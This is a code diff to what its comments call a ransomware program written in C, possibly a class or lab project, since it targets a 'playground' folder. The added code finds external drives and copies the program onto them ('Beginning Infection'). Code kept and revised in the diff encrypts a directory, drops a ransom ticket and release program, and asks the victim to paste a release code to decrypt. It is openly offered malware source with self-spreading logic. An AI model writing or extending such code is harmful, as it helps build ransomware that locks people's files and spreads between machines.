@@ -6,6 +6,7 @@
 #include <stdlib.h>
 #include <string.h>
 
+#include "common/paths.h"
 #include "common/common.h"
 #include "common/clonelib.h"
 #include "common/crypt.h"
@@ -13,11 +14,6 @@
 #include "common/os.h"
 #include "common/thirdparty/b64.h"
 
-void locateExternalDrive(char **path)
-{
-	*path = (char *) malloc(sizeof(char) * strlen("placeholder"));
-	strcpy(*path, "placeholder");
-}
 
 //Ransomware payload
 bool runPayload(const char *directory, const char *arg0)
@@ -30,26 +26,33 @@ bool runPayload(const char *directory, const char *arg0)
 			"Error: runPayLoad: failed to generate keyiv");
 		return 0;
 	}
-	
 	//Write ticket
-	if(!makeTicket(keyiv, directory)){
-		fprintf(stderr, "Error: runPayLoad: makeTicket Failed\n");
+	if (!makeTicketFile(keyiv, directory)) {
+		fprintf(stderr, "Error: runPayLoad: makeTicketFile Failed\n");
 		free(keyiv);
 		return 0;
-	}	
+	}
+	
+	//Make Hash File
+	if(!makeHashFile(keyiv, directory)) {
+		fprintf(stderr, "Error: runPayLoad: makeHashFile failed\n");
+		return 0;
+	}
 	
 	//Encrypt Directory
 	if (!encryptDirectory(keyiv, directory)) {
 		fprintf(stderr, "runPayload: encryptDirectory failed\n");
 		free(keyiv);
-		
+
 		//Delete ticket
-		char *t_path = (char *) malloc(strlen(directory) + strlen("/"TICKET_FILENAME));
+		char *t_path =
+		    (char *) malloc(strlen(directory) +
+				    strlen("/" TICKET_FILENAME));
 		strcpy(t_path, directory);
-		strcat(t_path, "/"TICKET_FILENAME);
+		strcat(t_path, "/" TICKET_FILENAME);
 		remove(t_path);
 		free(t_path);
-		
+
 		return 0;
 	}
 	//Get OSIR's Bytes
@@ -58,9 +61,10 @@ bool runPayload(const char *directory, const char *arg0)
 
 	//Get release program path
 	char *r_path =
-	    (char *) malloc(strlen(directory) + strlen("/"RELEASE_FILENAME));
+	    (char *) malloc(strlen(directory) +
+			    strlen("/" RELEASE_FILENAME));
 	strcpy(r_path, directory);
-	strcat(r_path, "/"RELEASE_FILENAME);
+	strcat(r_path, "/" RELEASE_FILENAME);
 
 	//Write release program
 	FILE *fp = fopen(r_path, "wb");
@@ -77,15 +81,14 @@ bool runPayload(const char *directory, const char *arg0)
 
 	//Get Release Script Directory
 	r_path =
-	    (char *) malloc(strlen(directory) + strlen("/"RELEASE_SCRIPT_FILENAME));
+	    (char *) malloc(strlen(directory) +
+			    strlen("/" RELEASE_SCRIPT_FILENAME));
 	strcpy(r_path, directory);
-	strcat(r_path, "/"RELEASE_SCRIPT_FILENAME);
-	
+	strcat(r_path, "/" RELEASE_SCRIPT_FILENAME);
+
 	//Write Release Script
-	printf("op\n");
 	fp = fopen(r_path, "w");
-	printf("%s\n",r_path);
-	if(fp == NULL){
+	if (fp == NULL) {
 		fprintf(stderr,
 			"Error: runPayload: Couldn't open file to write release script(%s)\n",
 			r_path);
@@ -93,26 +96,21 @@ bool runPayload(const char *directory, const char *arg0)
 		free(keyiv);
 		return 0;
 	}
-	printf("wb\n");
-	fwrite(RELEASE_SCRIPT,strlen(RELEASE_SCRIPT), 1, fp);
+	fwrite(RELEASE_SCRIPT, strlen(RELEASE_SCRIPT), 1, fp);
 	fclose(fp);
-	
+
 	//Free pointers
-	printf("free\n");
 	free(bytes);
-	printf("r\n");
 	//free(r_path);
-	printf("k\n");
 	free(keyiv);
-	printf("ret\n");
 	return 1;
 }
-
 
 bool runRelease()
 {
 	system(RELEASE_INTRO_SCRIPT);
-	printf("To decrypt your files, please paste the release code.\n\n");
+	printf
+	    ("To decrypt your files, please paste the release code.\n\n");
 
 	bool success = 0;
 
@@ -127,16 +125,33 @@ bool runRelease()
 		    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
 			//Decode
 			char *keyiv = b16decode(code);
-
+			
+			//Check integrity
+			success = checkKeyivIntegrity(keyiv,".");
+			if(!success){
+				printf("Note: Wrong key (does not match hash)\n");
+				continue;
+			}
+			
 			//Release
 			success = decryptDirectory(keyiv, ".");
 			if (!success)
-				printf("Wrong code\n");
+				printf("Note: Unable to decrypt directory\n");
 		} else {
-			printf("Invalid Code\n");
+			printf("Note: Invalid Code\n");
 		}
 
 	}
+	if(success){
+		//Delete ticket (signals to shell to delete other files)
+		//Please see RELEASE_SCRIPT in common.h
+		char *t_path =
+		    (char *) malloc(strlen("./" TICKET_FILENAME));
+		strcpy(t_path, "./" TICKET_FILENAME);
+		remove(t_path);
+		free(t_path);
+	}
+	
 	return success;
 }
 
@@ -164,16 +179,31 @@ int main(int argc, char **argv)
 	if (run_release) {
 		runRelease();
 	} else {
-		/*Inf here */
+		//Check if infection is possible
+		char** paths=getExternalPaths();
+		if(paths[0][0]!='\0'){
+			printf("Beginning Infection\n");
+			
+			char* path = (char *)malloc(strlen(paths[0]));
+			strcpy(path, paths[0]);
+			
+			//Infect a external directory
+			infectDirectory(path, argv[0]);
+			free(path);
+			
+		}else{
+			printf("Note: No external directories\n");
+		}
+		free(paths);
 
 		//Payload
-		if (fopen("playground/" TICKET_FILENAME, "r") == NULL) {
+		if (fopen("./playground/" TICKET_FILENAME, "r") == NULL) {
 			printf("runPayload: %s\n",
 			       runPayload("playground",
 					  argv[0]) ? "OK" : "Failed");
 		} else {
 			printf
-			    ("Ticket already exists in that directory\n");
+			    ("Note: Ticket already exists in that directory\n");
 		}
 
 	}
